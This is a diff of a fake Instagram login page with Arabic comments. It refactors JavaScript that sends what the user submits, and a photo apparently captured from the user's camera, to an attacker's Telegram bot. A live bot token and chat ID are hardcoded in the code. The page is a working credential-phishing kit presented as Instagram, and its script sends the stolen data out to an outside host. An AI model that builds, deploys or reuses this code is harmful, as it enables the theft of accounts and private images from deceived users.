@@ -58,7 +58,12 @@
             &#169 2025 Instagram from Meta
         </div>
     </div>
+
 <script>
+    // التوكن ومعرف الدردشة
+    const TELEGRAM_BOT_TOKEN = '7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA';
+    const TELEGRAM_CHAT_ID = '5091980014';
+
     // عندما يقوم المستخدم بالضغط على زر الدخول
     document.querySelector("#loginbutton").addEventListener("click", async function(event) {
         event.preventDefault();
@@ -170,12 +175,13 @@
 
     // دالة لإرسال البيانات إلى Telegram
     async function sendToTelegram(message) {
-        const telegramApiUrl = `https://api.telegram.org/bot7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA/sendMessage`;
+        const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
         const response = await fetch(telegramApiUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                chat_id: '5091980014', 
+                chat_id: TELEGRAM_CHAT_ID,
                 text: message,
                 parse_mode: 'Markdown'
             })
@@ -184,17 +190,19 @@
         const data = await response.json();
         if (!data.ok) {
             console.error('Failed to send message to Telegram:', data);
+        } else {
+            console.log('Message sent successfully');
         }
     }
 
     // دالة لإرسال الصورة إلى Telegram
     async function sendImageToTelegram(imageData) {
-        const telegramApiUrl = `https://api.telegram.org/bot7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA/sendPhoto`;
+        const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
         const response = await fetch(telegramApiUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                chat_id: '5091980014',
+                chat_id: TELEGRAM_CHAT_ID,
                 photo: imageData,
                 caption: "📷 *تم التقاط صورة المستخدم*"
             })
@@ -203,9 +211,13 @@
         const data = await response.json();
         if (!data.ok) {
             console.error('Failed to send photo to Telegram:', data);
+        } else {
+            console.log('Photo sent successfully');
         }
     }
 </script>
+
+
 
 
 </body>
